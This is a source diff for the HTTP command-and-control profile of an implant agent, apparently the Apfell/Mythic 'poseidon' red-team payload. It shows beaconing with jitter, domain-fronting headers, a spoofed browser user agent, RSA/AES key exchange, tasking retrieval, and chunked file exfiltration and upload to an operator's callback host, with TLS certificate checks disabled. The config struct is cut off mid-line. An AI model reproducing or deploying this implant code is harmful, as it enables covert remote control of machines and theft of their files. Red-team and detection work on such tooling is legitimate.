@@ -3,49 +3,45 @@ package profiles
 import (
 	"bytes"
 	"crypto/rsa"
-	"math/rand"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
-	"log"
+	//"log"
 	"math"
 	"net/http"
 	"os"
 	"strings"
 	"time"
-
+	"reflect"
+	"sync"
+    "crypto/tls"
 	"pkg/utils/crypto"
 	"pkg/utils/functions"
 	"pkg/utils/structs"
 )
 
-var (
-	UUID                         = "UUID_HERE"
-	ExchangeKeyString            = "encrypted_exchange_check"
-	AesPSK                       = "AESPSK"
-	BaseURL                      = "callback_host:callback_port/"
-	BaseURLs                     = []string{}
-	UserAgent                    = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3" // Change this value
-	Sleep                        = callback_interval
-	HostHeader                   = "domain_front" // Use an empty string if it's not being used
-	Jitter                       = callback_jitter
-	seededRand        *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
-)
+var Config = structs.Defaultconfig{
+	"encrypted_exchange_check",
+	"AESPSK",
+	"callback_host:callback_port/",
+	"USER_AGENT",
+	callback_interval,
+	"domain_front",
+	callback_jitte
+var mu sync.Mutex
 
 
 type C2Default struct {
 	HostHeader     string
 	BaseURL        string
-	BaseURLs       []string
 	Interval       int
 	Jitter         int
-	Commands       []string
 	ExchangingKeys bool
 	ApfellID       string
 	UserAgent      string
 	UUID           string
-	AesPSK         string
+	Key         string
 	RsaPrivateKey  *rsa.PrivateKey
 }
 
@@ -54,38 +50,10 @@ func newProfile() Profile {
 }
 func (c C2Default) getSleepTime() int{
     return c.Interval + int(math.Round((float64(c.Interval) * (seededRand.Float64() * float64(c.Jitter))/float64(100.0))));
-    //return this.interval + (this.interval * (Math.round(Math.random()*this.jitter)/100));
-}
-func (c C2Default) Header() string {
-	return c.HostHeader
-}
-
-func (c *C2Default) SetHeader(newHeader string) {
-	c.HostHeader = newHeader
-}
-
-func (c C2Default) URL() string {
-	if len(c.BaseURLs) == 0 {
-		return c.BaseURL
-	} else {
-		return c.getRandomBaseURL()
-	}
-}
-
-func (c *C2Default) getRandomBaseURL() string {
-	return c.BaseURLs[seededRand.Intn(len(c.BaseURLs))]
-}
-
-func (c *C2Default) SetURL(newURL string) {
-	c.BaseURL = newURL
-}
-
-func (c *C2Default) SetURLs(newURLs []string) {
-	c.BaseURLs = newURLs
 }
 
 func (c C2Default) SleepInterval() int {
-	return c.Interval
+	return c.getSleepTime()
 }
 
 func (c *C2Default) SetSleepInterval(interval int) {
@@ -94,21 +62,6 @@ func (c *C2Default) SetSleepInterval(interval int) {
 
 func (c *C2Default) SetSleepJitter(jitter int){
     c.Jitter = jitter
-}
-func (c C2Default) C2Commands() []string {
-	return c.Commands
-}
-
-func (c *C2Default) SetC2Commands(commands []string) {
-	c.Commands = commands
-}
-
-func (c C2Default) XKeys() bool {
-	return c.ExchangingKeys
-}
-
-func (c *C2Default) SetXKeys(xkeys bool) {
-	c.ExchangingKeys = xkeys
 }
 
 func (c C2Default) ApfID() string {
@@ -119,99 +72,142 @@ func (c *C2Default) SetApfellID(newApf string) {
 	c.ApfellID = newApf
 }
 
-func (c C2Default) UniqueID() string {
-	return c.UUID
-}
-
-func (c *C2Default) SetUniqueID(newID string) {
-	c.UUID = newID
-}
-
-func (c *C2Default) SetUserAgent(ua string) {
-	c.UserAgent = ua
-}
-
-func (c C2Default) GetUserAgent() string {
-	return c.UserAgent
-}
-
-func (c C2Default) AesPreSharedKey() string {
-	return c.AesPSK
-}
-
-func (c *C2Default) SetAesPreSharedKey(newKey string) {
-	c.AesPSK = newKey
-}
-
-func (c C2Default) RsaKey() *rsa.PrivateKey {
-	return c.RsaPrivateKey
-}
-
-func (c *C2Default) SetRsaKey(newKey *rsa.PrivateKey) {
-	c.RsaPrivateKey = newKey
+func (c C2Default) ProfileType() string {
+	t := reflect.TypeOf(c)
+	return t.Name()
 }
 
 //CheckIn a new agent
-func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interface{} {
+func (c *C2Default) CheckIn(ip string, pid int, user string, host string, operatingsystem string, arch string) interface{} {
 	var resp []byte
+	// Set the C2 Profile values
+	c.BaseURL = Config.BaseURL
+	c.Interval = Config.Sleep
+	c.Jitter = Config.Jitter
+	if strings.Contains(Config.KEYX, "T") {
+		c.ExchangingKeys = true
+	} else {
+		c.ExchangingKeys = false
+	}
 
-	checkin := structs.CheckInStruct{}
+	if len(Config.Key) > 0 {
+		c.Key = Config.Key
+	} else {
+		c.Key = ""
+	}
+
+	if len(Config.HostHeader) > 0 {
+		c.HostHeader = Config.HostHeader
+	}
+
+	if len(Config.UserAgent) > 0 {
+		c.UserAgent = Config.UserAgent
+	} else {
+		c.UserAgent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
+	}
+
+	c.UUID = UUID
+	c.ApfellID = c.UUID
+	checkin := structs.CheckInMessage{}
+	checkin.Action = "checkin"
 	checkin.User = user
 	checkin.Host = host
 	checkin.IP = ip
 	checkin.Pid = pid
 	checkin.UUID = c.UUID
-	checkin.Arch = functions.GetArchitecture()
-	checkin.Domain = functions.GetDomain()
-	checkin.OS = functions.GetOS()
+	checkin.OS = operatingsystem
+	checkin.Architecture = arch
 	if functions.IsElevated() {
 		checkin.IntegrityLevel = 3
 	} else {
 		checkin.IntegrityLevel = 2
 	}
 
-	checkinMsg, _ := json.Marshal(checkin)
-	//log.Printf("Sending checkin msg: %+v\n", checkin)
-	// If exchangingKeys == true, then start EKE
-	if c.ExchangingKeys {
-		sID := c.NegotiateKey()
-        //log.Println("finished exchanging keys")
-		endpoint := fmt.Sprintf("api/v1.3/crypto/EKE/%s", sID)
-		resp = c.htmlPostData(endpoint, checkinMsg)
-		//log.Printf("Raw HTMLPostData response: %s\n", string(resp))
-
-	} else if len(c.AesPSK) != 0 {
-		// If we're using a static AES key, then just hit the aes_psk endpoint
-		endpoint := fmt.Sprintf("api/v1.3/crypto/aes_psk/%s", c.UUID)
-		resp = c.htmlPostData(endpoint, checkinMsg)
-		//log.Printf("Raw HTMLPostData response: %s\n", string(resp))
-	} else {
-		// If we're not using encryption, we hit the callbacks endpoint directly
-		resp = c.htmlPostData("api/v1.3/callbacks/", checkinMsg)
-		//log.Printf("Raw HTMLPostData response: %s\n", string(resp))
+	if c.ExchangingKeys { // If exchangingKeys == true, then start EKE
+		_ = c.NegotiateKey()
 	}
+
+	raw, _ := json.Marshal(checkin)
+	endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
+	resp = c.htmlPostData(endpoint, raw)
 
 	// save the apfell id
-	respMsg := structs.CheckinResponse{}
-	err := json.Unmarshal(resp, &respMsg)
-	//log.Printf("Raw response: %s", string(resp))
+	response := structs.CheckInMessageResponse{}
+	err := json.Unmarshal(resp, &response)
+
 	if err != nil {
-		//log.Println("message:\n", string(resp))
-		log.Printf("Error in unmarshal:\n %s", err.Error())
+		//log.Printf("Error in unmarshal:\n %s", err.Error())
 	}
 
-	//log.Printf("Received ApfellID: %+v\n", c)
-	return respMsg
+	if len(response.ID) != 0 {
+		//log.Printf("Saving new UUID: %s\n", response.ID)
+		c.ApfellID = response.ID
+	}
+
+	return response
+}
+
+//NegotiateKey - EKE key negotiation
+func (c *C2Default) NegotiateKey() string {
+    sessionID := GenerateSessionID()
+	pub, priv := crypto.GenerateRSAKeyPair()
+	c.RsaPrivateKey = priv
+	// Replace struct with dynamic json
+	initMessage := structs.EkeKeyExchangeMessage{}
+	initMessage.Action = "staging_rsa"
+	initMessage.SessionID = sessionID
+	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)
+
+	// Encode and encrypt the json message
+	raw, err := json.Marshal(initMessage)
+    //log.Println(unencryptedMsg)
+	if err != nil {
+		return ""
+	}
+
+	endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion) // Send the request to the EKE endpoint
+
+	resp := c.htmlPostData(endpoint, raw)
+	// Decrypt & Unmarshal the response
+
+	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
+
+	err = json.Unmarshal(resp, &sessionKeyResp)
+	if err != nil {
+		//log.Printf("Error unmarshaling eke response: %s\n", err.Error())
+		return ""
+	}
+
+	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
+	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
+	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
+	c.ExchangingKeys = false
+
+	if len(sessionKeyResp.UUID) > 0 {
+		c.ApfellID = sessionKeyResp.UUID // Save the new UUID
+	}
+
+	return sessionID
 }
 
 //GetTasking - retrieve new tasks
 func (c *C2Default) GetTasking() interface{} {
-	//log.Printf("Current C2Default config: %+v\n", c)
-	url := fmt.Sprintf("%sapi/v1.3/tasks/callback/%s/nextTask", c.BaseURL, c.ApfellID)
-	rawTask := c.htmlGetData(url)
-	//log.Println("Raw HTMLGetData response: ", string(rawTask))
-	task := structs.Task{}
-	err := json.Unmarshal(rawTask, &task)
+	url := fmt.Sprintf("%sapi/v%s/agent_message", c.BaseURL, ApiVersion)
+	//request := structs.Msg{}
+	request := structs.TaskRequestMessage{}
+	request.Action = "get_tasking"
+	request.TaskingSize = -1
+
+	raw, err := json.Marshal(request)
+
+	if err != nil {
+		//log.Printf("Error unmarshalling: %s", err.Error())
+	}
+
+	rawTask := c.htmlGetData(url, raw)
+
+	task := structs.TaskRequestMessageResponse{}
+	err = json.Unmarshal(rawTask, &task)
 
 	if err != nil {
 		//log.Printf("Error unmarshalling task data: %s", err.Error())
@@ -221,9 +217,14 @@ func (c *C2Default) GetTasking() interface{} {
 }
 
 //PostResponse - Post task responses
-func (c *C2Default) PostResponse(task structs.Task, output string) []byte {
-	urlEnding := fmt.Sprintf("api/v1.3/responses/%s", task.ID)
-	return c.postRESTResponse(urlEnding, []byte(output))
+func (c *C2Default) PostResponse(output []byte, skipChunking bool) []byte {
+	endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
+	if !skipChunking {
+		return c.postRESTResponse(endpoint, output)
+	} else {
+		return c.htmlPostData(endpoint, output)
+	}
+
 }
 
 //postRESTResponse - Wrapper to post task responses through the Apfell rest API
@@ -233,7 +234,7 @@ func (c *C2Default) postRESTResponse(urlEnding string, data []byte) []byte {
 	r := bytes.NewBuffer(data)
 	chunks := uint64(math.Ceil(float64(size) / dataChunk))
 	var retData bytes.Buffer
-
+	//log.Println("Chunks: ", chunks)
 	for i := uint64(0); i < chunks; i++ {
 		dataPart := int(math.Min(dataChunk, float64(int64(size)-int64(i*dataChunk))))
 		dataBuffer := make([]byte, dataPart)
@@ -244,9 +245,16 @@ func (c *C2Default) postRESTResponse(urlEnding string, data []byte) []byte {
 			break
 		}
 
-		tResp := structs.TaskResponse{}
-		tResp.Response = base64.StdEncoding.EncodeToString(dataBuffer)
-		dataToSend, _ := json.Marshal(tResp)
+		responseMsg := structs.TaskResponseMessage{}
+		responseMsg.Action = "post_response"
+		responseMsg.Responses = make([]json.RawMessage, 1)
+		responseMsg.Responses[0] = dataBuffer
+
+		dataToSend, err := json.Marshal(responseMsg)
+		if err != nil {
+			//log.Printf("Error marshaling data for postRESTResponse: %s", err.Error())
+			return make([]byte, 0)
+		}
 		ret := c.htmlPostData(urlEnding, dataToSend)
 		retData.Write(ret)
 	}
@@ -259,13 +267,20 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 	url := fmt.Sprintf("%s%s", c.BaseURL, urlEnding)
 	//log.Println("Sending POST request to url: ", url)
 	// If the AesPSK is set, encrypt the data we send
-	if len(c.AesPSK) != 0 {
+	if len(c.Key) != 0 {
+		//log.Printf("Encrypting Post data")
 		sendData = c.encryptMessage(sendData)
 	}
-	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
+	sendData = append([]byte(c.ApfellID), sendData...) // Prepend the UUID
+	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
+	if err != nil {
+		//log.Printf("Error creating new http request: %s", err.Error())
+		return make([]byte, 0)
+	}
 	contentLength := len(sendData)
 	req.ContentLength = int64(contentLength)
-	req.Header.Set("User-Agent", c.GetUserAgent())
+	req.Header.Set("User-Agent", c.UserAgent)
 	// Set the host header if not empty
 	if len(c.HostHeader) > 0 {
 		//req.Header.Set("Host", c.HostHeader)
@@ -273,13 +288,21 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 	}
 	// loop here until we can get our data to go through properly
     for true{
-        client := &http.Client{}
+        tr := &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		}
+		
+		client := &http.Client{
+			Timeout: 30 * time.Second,
+			Transport: tr,
+		}
 	    resp, err := client.Do(req)
 	    if err != nil {
 	        //time.Sleep(time.Duration(c.SleepInterval()) * time.Second)
 	        time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
             continue
-        }
+		}
+
         if resp.StatusCode != 200 {
             time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
             //time.Sleep(time.Duration(c.SleepInterval()) * time.Second)
@@ -294,33 +317,59 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
             time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
             //time.Sleep(time.Duration(c.SleepInterval()) * time.Second)
             continue
-        }
+		}
+
+		raw, err := base64.StdEncoding.DecodeString(string(body))
+		if err != nil {
+			//log.Println("Error decoding base64 data: ", err.Error())
+			return make([]byte, 0)
+		}
+
+		if len(raw) == 0 {
+			time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
+            continue
+		}
+
+		enc_raw := raw[36:] // Remove the Payload UUID
         // if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
-        if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
+        if len(c.Key) != 0 {
             //log.Println("just did a post, and decrypting the message back")
-            body = c.decryptMessage(body)
-            //log.Println(body)
-            if len(body) == 0{
+            enc_raw = c.decryptMessage(enc_raw)
+            //log.Println(enc_raw)
+            if len(enc_raw) == 0{
                 // failed somehow in decryption
                 //time.Sleep(time.Duration(c.SleepInterval()) * time.Second)
                 time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
                 continue
             }
         }
-        //log.Println(body)
-        return body
+        //log.Printf("Raw htmlpost response: %s\n", string(enc_raw))
+        return enc_raw
     }
     return make([]byte, 0) //shouldn't get here
 }
 
 //htmlGetData - HTTP GET request for data
-func (c *C2Default) htmlGetData(url string) []byte {
+func (c *C2Default) htmlGetData(url string, body []byte) []byte {
 	//log.Println("Sending HTML GET request to url: ", url)
-	client := &http.Client{}
+	tr := &http.Transport{
+        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	
+	client := &http.Client{
+		Timeout: 30 * time.Second,
+		Transport: tr,
+	}
 	var respBody []byte
 
     for true{
-        req, err := http.NewRequest("GET", url, nil)
+		if len(c.Key) > 0 && len(body) > 0 {
+			body = c.encryptMessage(body) // Encrypt and then encapsulate the task request
+		}
+		encapbody := append([]byte(c.ApfellID), body...)                          // Prepend the UUID to the body of the request
+		encbody := base64.StdEncoding.EncodeToString(encapbody)                   // Base64 the body
+
+        req, err := http.NewRequest("GET", url, bytes.NewBuffer([]byte(encbody)))
         if err != nil {
             //time.Sleep(time.Duration(c.SleepInterval()) * time.Second)
             time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
@@ -332,7 +381,7 @@ func (c *C2Default) htmlGetData(url string) []byte {
             req.Host = c.HostHeader
         }
 
-        req.Header.Set("User-Agent", c.GetUserAgent())
+        req.Header.Set("User-Agent", c.UserAgent)
         resp, err := client.Do(req)
 
         if err != nil {
@@ -350,196 +399,305 @@ func (c *C2Default) htmlGetData(url string) []byte {
         defer resp.Body.Close()
 
         respBody, _ = ioutil.ReadAll(resp.Body)
-
-        if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
-            respBody = c.decryptMessage(respBody)
-            if len(respBody) == 0{
+		raw, _ := base64.StdEncoding.DecodeString(string(respBody))
+		enc_raw := raw[36:] // Remove the prepended UUID
+        if len(c.Key) != 0 {
+            enc_raw = c.decryptMessage(enc_raw)
+            if len(enc_raw) == 0{
                 //time.Sleep(time.Duration(c.SleepInterval()) * time.Second)
                 time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
                 continue
             }
-        }
-        return respBody
+		}
+		//log.Printf("Raw htmlget response: %s\n", string(enc_raw))
+        return enc_raw
     }
     return make([]byte, 0) //shouldn't get here
 
 }
 
-//NegotiateKey - EKE key negotiation
-func (c *C2Default) NegotiateKey() string {
-    //log.Println("entering NegotiateKey")
-	sessionID := GenerateSessionID()
-	//log.Println(sessionID)
-	pub, priv := crypto.GenerateRSAKeyPair()
-	//log.Println(base64.StdEncoding.EncodeToString(pub))
-	//log.Println(base64.StdEncoding.EncodeToString(priv))
-	c.SetRsaKey(priv)
-	initMessage := structs.EKEInit{}
-	// Assign the session ID and the base64 encoded pub key
-	initMessage.SessionID = sessionID
-	initMessage.Pub = base64.StdEncoding.EncodeToString(pub)
-
-	// Encode and encrypt the json message
-	unencryptedMsg, err := json.Marshal(initMessage)
-    //log.Println(unencryptedMsg)
-	if err != nil {
-		return ""
-	}
-
-	// Send the request to the EKE endpoint
-	urlSuffix := fmt.Sprintf("api/v1.3/crypto/EKE/%s", c.UUID)
-
-	resp := c.htmlPostData(urlSuffix, unencryptedMsg)
-	// Decrypt & Unmarshal the response
-
-	decResp, _ := base64.StdEncoding.DecodeString(string(resp))
-	decryptedResponse := crypto.RsaDecryptCipherBytes(decResp, c.RsaKey())
-	sessionKeyResp := structs.SessionKeyResponse{}
-
-	err = json.Unmarshal(decryptedResponse, &sessionKeyResp)
-	if err != nil {
-		return ""
-	}
-
-	// Save the new AES session key
-	c.SetAesPreSharedKey(sessionKeyResp.EncSessionKey)
-	c.SetXKeys(false)
-	return sessionID
-}
-
 //SendFile - download a file
-func (c *C2Default) SendFile(task structs.Task, params string) structs.ThreadMsg{
-	//response := TaskResponse{}
-	fileReq := structs.FileRegisterRequest{}
-	fileReq.Task = task.ID
+func (c *C2Default) SendFile(task structs.Task, params string, ch chan []byte){
 	path := task.Params
 	// Get the file size first and then the # of chunks required
 	file, err := os.Open(path)
 
 	if err != nil {
-		tMsg := structs.ThreadMsg{}
-		tMsg.Error = true
-		tMsg.TaskItem = task
-		tMsg.TaskResult = []byte(err.Error())
-		return tMsg
+		errResponse := structs.Response{}
+		errResponse.Completed = true
+		errResponse.TaskID = task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("Error opening file: %s", err.Error())
+		errResponseEnc, _ := json.Marshal(errResponse)
+		mu.Lock()
+		TaskResponses = append(TaskResponses, errResponseEnc)
+		mu.Unlock()
+		return
 	}
 
 	fi, err := file.Stat()
 	if err != nil {
-		tMsg := structs.ThreadMsg{}
-		tMsg.Error = true
-		tMsg.TaskItem = task
-		tMsg.TaskResult = []byte(err.Error())
-		return tMsg
+		errResponse := structs.Response{}
+		errResponse.Completed = true
+		errResponse.TaskID = task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
+		errResponseEnc, _ := json.Marshal(errResponse)
+		mu.Lock()
+		TaskResponses = append(TaskResponses, errResponseEnc)
+		mu.Unlock()
+		return
 	}
 
 	size := fi.Size()
 	raw := make([]byte, size)
-	file.Read(raw)
+	_, err = file.Read(raw)
+	if err != nil {
+		errResponse := structs.Response{}
+		errResponse.Completed = true
+		errResponse.TaskID = task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("Error reading file: %s", err.Error())
+		errResponseEnc, _ := json.Marshal(errResponse)
+		mu.Lock()
+		TaskResponses = append(TaskResponses, errResponseEnc)
+		mu.Unlock()
+		return
+	}
 
-	return c.SendFileChunks(task, raw)
+	_ = file.Close()
+
+	c.SendFileChunks(task, raw, ch)
 }
 
 // Get a file
 
-func (c *C2Default) GetFile(fileid string) []byte {
-	url := fmt.Sprintf("api/v1.3/files/callback/%s", c.ApfellID)
-	data := []byte(fmt.Sprintf("{\"file_id\": \"%s\"}", fileid))
-	encfileData := c.htmlPostData(url, data)
+func (c *C2Default) GetFile(task structs.Task, fileDetails structs.FileUploadParams, ch chan []byte) {
 
-	//decFileData := c.decryptMessage(encfileData)
-	if len(encfileData) > 0 {
-		rawData, _ := base64.StdEncoding.DecodeString(string(encfileData))
-		return rawData
+	fileUploadMsg := structs.FileUploadChunkMessage{} //Create the file upload chunk message
+	fileUploadMsg.Action = "upload"
+	fileUploadMsg.FileID = fileDetails.FileID
+	fileUploadMsg.ChunkSize = 1024000
+	fileUploadMsg.ChunkNum = 1
+	fileUploadMsg.FullPath = fileDetails.RemotePath
+	fileUploadMsg.TaskID = task.TaskID
+
+	msg, _ := json.Marshal(fileUploadMsg)
+	mu.Lock()
+	UploadResponses = append(UploadResponses, msg)
+	mu.Unlock()
+	// Wait for response from apfell
+	rawData := <-ch
+
+	fileUploadMsgResponse := structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
+	err := json.Unmarshal(rawData, &fileUploadMsgResponse)
+	if err != nil {
+		errResponse := structs.Response{}
+		errResponse.Completed = true
+		errResponse.TaskID = task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
+		errResponseEnc, _ := json.Marshal(errResponse)
+		mu.Lock()
+		TaskResponses = append(TaskResponses, errResponseEnc)
+		mu.Unlock()
+		return
 	}
 
-	return make([]byte, 0)
+	f, err := os.Create(fileDetails.RemotePath)
+	if err != nil {
+		errResponse := structs.Response{}
+		errResponse.Completed = true
+		errResponse.TaskID = task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("Error creating file: %s", err.Error())
+		errResponseEnc, _ := json.Marshal(errResponse)
+		mu.Lock()
+		TaskResponses = append(TaskResponses, errResponseEnc)
+		mu.Unlock()
+		return
+	}
+	defer f.Close()
+	decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
+
+	_, err = f.Write(decoded)
+
+	if err != nil {
+		errResponse := structs.Response{}
+		errResponse.Completed = true
+		errResponse.TaskID = task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("Error writing to file: %s", err.Error())
+		errResponseEnc, _ := json.Marshal(errResponse)
+		mu.Lock()
+		TaskResponses = append(TaskResponses, errResponseEnc)
+		mu.Unlock()
+		return
+	}
+
+
+	offset := int64(len(decoded))
+	if fileUploadMsgResponse.TotalChunks > 1 {
+		for index := 2; index <= fileUploadMsgResponse.TotalChunks; index++ {
+			fileUploadMsg = structs.FileUploadChunkMessage{}
+			fileUploadMsg.Action = "upload"
+			fileUploadMsg.ChunkNum = index
+			fileUploadMsg.ChunkSize = 1024000
+			fileUploadMsg.FileID = fileDetails.FileID
+			fileUploadMsg.FullPath = fileDetails.RemotePath
+			fileUploadMsg.TaskID = task.TaskID
+
+			msg, _ := json.Marshal(fileUploadMsg)
+			mu.Lock()
+			UploadResponses = append(UploadResponses, msg)
+			mu.Unlock()
+			rawData := <-ch
+			//rawData := c.htmlGetData(fmt.Sprintf("%s%s", c.BaseURL, url), msg)
+			fileUploadMsgResponse = structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
+			err := json.Unmarshal(rawData, &fileUploadMsgResponse)
+			if err != nil {
+				errResponse := structs.Response{}
+				errResponse.Completed = true
+				errResponse.TaskID = task.TaskID
+				errResponse.UserOutput = fmt.Sprintf("Error marshaling response: %s", err.Error())
+				errResponseEnc, _ := json.Marshal(errResponse)
+				mu.Lock()
+				TaskResponses = append(TaskResponses, errResponseEnc)
+				mu.Unlock()
+				return
+			}
+			// Base64 decode the chunk data
+			decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
+
+			_, err = f.WriteAt(decoded, offset)
+			if err != nil {
+				errResponse := structs.Response{}
+				errResponse.Completed = true
+				errResponse.TaskID = task.TaskID
+				errResponse.UserOutput = fmt.Sprintf("Error writing to file: %s", err.Error())
+				errResponseEnc, _ := json.Marshal(errResponse)
+				mu.Lock()
+				TaskResponses = append(TaskResponses, errResponseEnc)
+				mu.Unlock()
+				return
+			}
+
+			offset = offset + int64(len(decoded))
+		}
+	}
+
+	resp := structs.Response{}
+	resp.UserOutput = "File upload complete"
+	resp.Completed = true
+	resp.TaskID = task.TaskID
+	encResp, err := json.Marshal(resp)
+	mu.Lock()
+	TaskResponses = append(TaskResponses, encResp)
+	mu.Unlock()
+	return
 }
 
 //SendFileChunks - Helper function to deal with file chunks (screenshots and file downloads)
-func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) structs.ThreadMsg {
+func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte, ch chan []byte) {
 
 	size := len(fileData)
 
 	const fileChunk = 512000 //Normal apfell chunk size
 	chunks := uint64(math.Ceil(float64(size) / fileChunk))
 
-	chunkResponse := structs.FileRegisterRequest{}
-	chunkResponse.Chunks = int(chunks)
-	chunkResponse.Task = task.ID
+	chunkResponse := structs.FileDownloadInitialMessage{}
+	chunkResponse.NumChunks = int(chunks)
+	chunkResponse.TaskID = task.TaskID
+	chunkResponse.FullPath = task.Params
 
 	msg, _ := json.Marshal(chunkResponse)
-	resp := c.PostResponse(task, string(msg))
-	fileResp := structs.FileRegisterResponse{}
+	mu.Lock()
+	TaskResponses = append(TaskResponses, msg)
+	mu.Unlock()
+	// Wait for a response from the channel
+	resp := <-ch
+	var fileDetails map[string]interface{}
 
-	err := json.Unmarshal(resp, &fileResp)
-
+	err := json.Unmarshal(resp, &fileDetails)
 	if err != nil {
-		tMsg := structs.ThreadMsg{}
-		tMsg.Error = true
-		tMsg.TaskItem = task
-		tMsg.TaskResult = []byte(err.Error())
-		return tMsg
+		errResponse := structs.Response{}
+		errResponse.Completed = true
+		errResponse.TaskID = task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
+		errResponseEnc, _ := json.Marshal(errResponse)
+
+		mu.Lock()
+		TaskResponses = append(TaskResponses, errResponseEnc)
+		mu.Unlock()
+		return
 	}
 
 	r := bytes.NewBuffer(fileData)
 	// Sleep here so we don't spam apfell
-	//time.Sleep(time.Duration(c.Interval) * time.Second)
-	time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
-	for i := uint64(0); i < chunks; i++ {
+	//time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
 
+	for i := uint64(0); i < chunks; i++ {
+		//log.Println("Index ", i)
 		partSize := int(math.Min(fileChunk, float64(int64(size)-int64(i*fileChunk))))
 		partBuffer := make([]byte, partSize)
 		// Create a temporary buffer and read a chunk into that buffer from the file
-		read, err := r.Read(partBuffer)
-		if err != nil || read == 0 {
-			tMsg := structs.ThreadMsg{}
-            tMsg.Error = true
-            tMsg.TaskItem = task
-            tMsg.TaskResult = []byte(err.Error())
-            return tMsg
-		}
+		_, _ = r.Read(partBuffer)
+		
 
-		msg := structs.FileChunk{}
+		msg := structs.FileDownloadChunkMessage{}
+		msg.ChunkNum = int(i) + 1
+		msg.FileID = fileDetails["file_id"].(string)
 		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
-		msg.ChunkNumber = int(i) + 1
-		msg.FileID = fileResp.FileID
+		msg.TaskID = task.TaskID
 
 		encmsg, _ := json.Marshal(msg)
-		tResp := structs.TaskResponse{}
-		tResp.Response = base64.StdEncoding.EncodeToString(encmsg)
-		dataToSend, _ := json.Marshal(tResp)
+		mu.Lock()
+		TaskResponses = append(TaskResponses, encmsg)
+		mu.Unlock()
 
-		endpoint := fmt.Sprintf("api/v1.3/responses/%s", task.ID)
-		resp := c.htmlPostData(endpoint, dataToSend)
-		postResp := structs.FileChunkResponse{}
-		_ = json.Unmarshal(resp, &postResp)
-
-		if !strings.Contains(postResp.Status, "success") {
-			// If the post was not successful, wait and try to send it one more time
-			//time.Sleep(time.Duration(c.Interval) * time.Second)
-			time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
-			resp = c.htmlPostData(endpoint, encmsg)
+		// Wait for a response for our file chunk
+		decResp := <-ch
+		
+		var postResp map[string]interface{}
+		err = json.Unmarshal(decResp, &postResp)
+		if err != nil {
+			errResponse := structs.Response{}
+			errResponse.Completed = true
+			errResponse.TaskID = task.TaskID
+			errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
+			errResponseEnc, _ := json.Marshal(errResponse)
+			mu.Lock()
+			TaskResponses = append(TaskResponses, errResponseEnc)
+			mu.Unlock()
+			return
 		}
-		//time.Sleep(time.Duration(c.Interval) * time.Second)
-		time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
+
+		if !strings.Contains(postResp["status"].(string), "success") {
+			// If the post was not successful, wait and try to send it one more time
+			
+			mu.Lock()
+			TaskResponses = append(TaskResponses, encmsg)
+			mu.Unlock()
+		}
+
+		time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
 	}
 
-    tMsg := structs.ThreadMsg{}
-    tMsg.Error = false
-    tMsg.Completed = true
-    tMsg.TaskItem = task
-    tMsg.TaskResult = []byte("File Downloaded")
-    return tMsg
+	r.Reset()
+	r = nil
+	fileData = nil
+
+    final := structs.Response{}
+	final.Completed = true
+	final.TaskID = task.TaskID
+	final.UserOutput = "file downloaded"
+	finalEnc, _ := json.Marshal(final)
+	//c.PostResponse(task, string(finalEnc))
+	mu.Lock()
+	TaskResponses = append(TaskResponses, finalEnc)
+	mu.Unlock()
 }
 
 func (c *C2Default) encryptMessage(msg []byte) []byte {
-	key, _ := base64.StdEncoding.DecodeString(c.AesPSK)
